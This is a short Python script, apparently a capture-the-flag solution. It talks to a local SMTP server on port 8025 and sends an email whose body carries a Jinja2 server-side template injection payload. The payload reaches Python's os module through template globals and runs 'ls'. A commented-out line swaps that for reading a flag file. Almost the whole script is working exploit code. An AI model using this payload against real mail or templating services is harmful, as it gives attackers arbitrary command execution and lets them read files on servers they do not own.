import socket

EMAIL_ADDRESS = "biibybrgqsyy@00eb0cbc149d"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8025))

print(s.recv(1024))

def send_and_print(payload):
   s.send(payload)
   print(f"sending: {payload.decode()}", end="")
   print(f"received: {s.recv(1024).decode()}")

send_and_print("HELO relay.example.org\r\n".encode())
send_and_print("MAIL FROM:<a@example.org>\r\n".encode())
send_and_print(f"RCPT TO:<{EMAIL_ADDRESS}>\r\n".encode())

send_and_print(b"DATA\r\n")

message = b"""Subject: example\r\n\r\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}\r\n.\r\n"""
#message = b"""Subject: example\r\n\r\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag-901fe1fb92.txt').read() }}\r\n.\r\n"""

send_and_print(message)

send_and_print(b"QUIT\r\n")